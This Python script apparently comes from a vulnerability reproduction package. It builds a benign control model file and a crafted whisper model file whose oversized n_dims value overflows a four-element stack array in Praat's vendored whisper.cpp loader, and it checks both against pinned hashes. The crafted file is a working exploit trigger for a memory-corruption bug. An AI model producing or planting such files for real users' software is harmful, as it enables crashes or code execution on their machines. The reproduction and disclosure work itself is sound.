#!/usr/bin/env python3
"""Build (and verify) the two model artifacts for praat.whisper_ggml_ndims_stack_oob.

Attacker capability: ONE legacy whisper `.bin` model file, placed in the folder
Praat's own dialog tells the user to use:

    <preferences folder>/models/whispercpp/<name>.bin

(fon/praat_SpeechRecognizer.cpp:34-38: "You can install them into the subfolder
'whispercpp' of the folder 'models' in the Praat preferences folder".)

Base file: upstream whisper.cpp's own test fixture `models/for-tests-ggml-tiny.bin`
(a valid legacy header + mel filters + vocab with zero tensor records).  Praat's
vendored copy of the loader reads exactly the same layout
(external/whispercpp/whisper.cpp:1495-1600).

We append one tensor record in the documented order
(n_dims i32, name_len i32, ttype i32, ne[n_dims] i32, name bytes, data):

  model_benign.bin  n_dims = 1     -> the loop writes ne[0] only          (control)
  model_evil.bin    n_dims = 1024  -> the loop writes ne[0..1023]         (positive)

external/whispercpp/whisper.cpp:1883-1887:

    int32_t nelements = 1;
    int32_t ne[4] = { 1, 1, 1, 1 };
    for (int i = 0; i < n_dims; ++i) {
        read_safe(loader, ne[i]);
        nelements *= ne[i];
    }

`ne` is a four-element stack array; `n_dims` is an attacker-controlled int32 read
at line 1874 with no range check anywhere in the file (grep for `n_dims` in that
translation unit returns only the two read loops).  Upstream whisper.cpp added
`if (n_dims < 0 || n_dims > 4)` at its line 1894; this vendored copy never got it.

The script regenerates both files from the pinned base fixture and verifies their
SHA-256 against the values recorded when the bug was first confirmed.  Any
mismatch is a hard error.
"""
import hashlib
import json
import pathlib
import struct
import sys

HERE = pathlib.Path(__file__).resolve().parent
FIXTURE = HERE / "for-tests-ggml-tiny.bin"
OUT = HERE / "context" / "artifact"

TENSOR_NAME = b"encoder.ln_post.bias"
N_AUDIO_STATE = 384
EVIL_N_DIMS = 1024

PINNED = {
    "model_benign.bin": "fdeedf6436aaa54279b435db7530a8b708a63b95cdc6823739f712968d08a80c",
    "model_evil.bin": "2f9c3ff68c2fdf59e6fc964427a140507f65e294d3835c2f2d4ec48861e5811a",
}


def record(n_dims):
    body = struct.pack("<iii", n_dims, len(TENSOR_NAME), 0)  # ttype 0 == F32
    body += struct.pack("<i", N_AUDIO_STATE)
    if n_dims != 1:
        # one legal dim followed by filler the loop will keep consuming
        body += b"".join(struct.pack("<i", 0x41414141) for _ in range(n_dims - 1))
    body += TENSOR_NAME
    body += b"".join(struct.pack("<f", (i % 97) / 97.0 - 0.5)
                     for i in range(N_AUDIO_STATE))
    return body


def sha256(p):
    return hashlib.sha256(pathlib.Path(p).read_bytes()).hexdigest()


def main():
    base = FIXTURE.read_bytes()
    assert base[:4] == b"lmgg", "unexpected magic in the base fixture"
    OUT.mkdir(parents=True, exist_ok=True)

    ok = True
    lines = []
    for name, n_dims in [("model_benign.bin", 1), ("model_evil.bin", EVIL_N_DIMS)]:
        data = base + record(n_dims)
        p = OUT / name
        p.write_bytes(data)
        h = sha256(p)
        match = h == PINNED[name]
        ok &= match
        lines.append(f"{h}  context/artifact/{name}")
        print(f"{name}: size={len(data)}")
        print(f"  sha256  {h}")
        print(f"  pinned  {PINNED[name]}")
        print(f"  match   {match}")

    fixture_line = f"{sha256(FIXTURE)}  for-tests-ggml-tiny.bin"
    lines.append(fixture_line)
    print(fixture_line)

    (HERE / "SHA256SUMS.txt").write_text("\n".join(lines) + "\n", encoding="utf-8")
    print("SHA256SUMS.txt written")

    if not ok:
        print("FAILED: regenerated artifact does not match the pinned hash", file=sys.stderr)
        return 1
    print("OK: both artifacts reproduced from the pinned base fixture")
    return 0


if __name__ == "__main__":
    sys.exit(main())
